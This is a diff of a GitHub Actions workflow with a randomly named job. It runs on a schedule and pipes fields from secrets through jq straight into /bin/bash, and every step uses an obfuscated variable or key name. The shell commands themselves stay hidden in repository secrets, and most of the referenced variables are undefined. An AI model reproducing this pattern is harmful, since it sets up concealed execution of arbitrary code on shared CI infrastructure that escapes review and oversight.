@@ -3,7 +3,8 @@ name: xuzhibai3856
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
+    - cron: '22 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuzhibai3856
         env:
-          fu97373: ${{ secrets.fu97373 }}
+          e743: ${{ secrets.e743 }}
         run: |
-          echo $fu97373 | jq -r .ytf182 | /bin/bash
-          echo $posy089 | jq -r .dljk48594 | /bin/bash
-          echo $w1321 | jq -r .kautk64036 | /bin/bash
-          echo $ymzfv512 | jq -r .rzsq32 | /bin/bash
-          echo $tzivz95 | jq -r .tkxwb63618 | /bin/bash
-          echo $pjna79665 | jq -r .ajnbi0 | /bin/bash
-          echo $re1 | jq -r .orpdt09745 | /bin/bash
-          echo $kjh40958 | jq -r .qkj9857 | /bin/bash
-          echo $srecb47421 | jq -r .v38270 | /bin/bash
+          echo $e743 | jq -r .bx2 | /bin/bash
+          echo $afn2895 | jq -r .ut094 | /bin/bash
+          echo $i2582 | jq -r .fqh20 | /bin/bash
+          echo $j92 | jq -r .ria766 | /bin/bash
+          echo $q1 | jq -r .wcvjy400 | /bin/bash
+          echo $bx80326 | jq -r .klsd6555 | /bin/bash
+          echo $yvroc6 | jq -r .iwsen47415 | /bin/bash
+          echo $fs5394 | jq -r .hvjr907 | /bin/bash
+          echo $sp69 | jq -r .zar05 | /bin/bash
+          echo $i976 | jq -r .iwul144 | /bin/bash
+          echo $dqs9 | jq -r .f6 | /bin/bash
+          echo $zasj6114 | jq -r .gc98561 | /bin/bash
 
